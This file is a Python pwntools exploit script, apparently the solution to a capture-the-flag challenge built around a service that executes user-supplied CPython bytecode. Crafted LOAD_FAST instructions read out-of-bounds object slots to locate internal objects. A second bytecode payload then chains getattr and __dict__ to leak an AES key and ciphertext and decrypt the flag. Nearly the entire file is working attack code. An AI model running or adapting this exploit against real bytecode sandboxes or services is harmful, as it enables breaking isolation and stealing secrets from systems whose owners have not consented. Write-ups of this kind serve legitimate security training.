import ast, re

from pwn import *
from bytecode import ConcreteInstr

from Crypto.Cipher import AES

context.log_level = "error"


def op(op, arg=None):
    return (
        ConcreteInstr(op, arg).assemble()
        if arg is not None
        else ConcreteInstr(op).assemble()
    )


host = "0.0.0.0"
port = 1337

idx_2_obj = {}
for i in range(0, 300):
    io = remote(host, port)
    oob_read_bytecode = b"".join(
        [
            op("RESUME", 0),
            op("LOAD_FAST", i),
            op("RETURN_VALUE"),
        ]
    ).hex()
    io.recvuntil(b"Program: ")
    io.sendline(bytes(oob_read_bytecode, encoding="utf-8"))
    try:
        response = io.recvline().rstrip()
        if response != b"Try harder...":
            idx_2_obj[i] = response
    except EOFError:
        ...
    finally:
        io.close()

context_idx, aes_idx, get_attr_idx, dict_idx = None, None, None, None
for idx, obj in idx_2_obj.items():
    if b"<__main__.Context object at" in obj:
        context_idx = idx
    elif b"aes" == obj:
        aes_idx = idx
    elif b"<built-in function getattr>" == obj:
        get_attr_idx = idx
    elif b"__dict__" == obj:
        dict_idx = idx

assert context_idx is not None
assert aes_idx is not None
assert get_attr_idx is not None
assert dict_idx is not None

print("[+] First stage done!")

exploit = b"".join(
    [
        op("RESUME", 0),
        op("LOAD_FAST", get_attr_idx),  # getattr builtin
        op("LOAD_FAST", context_idx),  # Context
        op("LOAD_FAST", dict_idx),  # __dict__
        op("CALL", 1),
        op("LOAD_FAST", aes_idx),  # 'aes'
        op("BINARY_SUBSCR"),  # AES obj
        b"\x00" * 8,
        op("LOAD_FAST", get_attr_idx),  # getattr builtin
        op("COPY", 2),
        op("LOAD_FAST", dict_idx),  # __dict__
        op("CALL", 1),
        op("LOAD_FAST", get_attr_idx),
        op("LOAD_FAST", context_idx),  # Context
        op("LOAD_FAST", dict_idx),  # __dict__
        op("CALL", 1),
        b"\x00" * 8,
        op("BINARY_OP", 7),  # merge dicts
        op("RETURN_VALUE"),  # return
    ]
).hex()

## Now that we have the indices for loading we should try multiple times to send the exploit as the success is probabilistic

response = b""
while b"ct" not in response and b"key_matrices" not in response:
    io = remote(host, port)
    io.recvuntil(b"Program: ")
    io.sendline(bytes(exploit, encoding="utf-8"))
    try:
        response = io.recvline().rstrip()
    except Exception as e:
        print("[+] Exploit failed trying again...")
print("[+] Success!")


def extract_data(python_string):
    cleaned_string = re.sub(
        r"<aes\.AES object at 0x[a-fA-F0-9]+>", "None", python_string
    )
    data_dict = ast.literal_eval(cleaned_string)

    first_key_matrix = data_dict["_key_matrices"][0]
    flattened_first_row = []
    for sublist in first_key_matrix:
        flattened_first_row.extend(sublist)

    ct_bytes = data_dict["ct"]
    ct_bytearray = bytearray(ct_bytes)
    return flattened_first_row, ct_bytearray


aes_key, ct = extract_data(response.decode())
cipher = AES.new(bytearray(aes_key), AES.MODE_ECB)
flag = cipher.decrypt(ct)

print("Flag: ", flag)
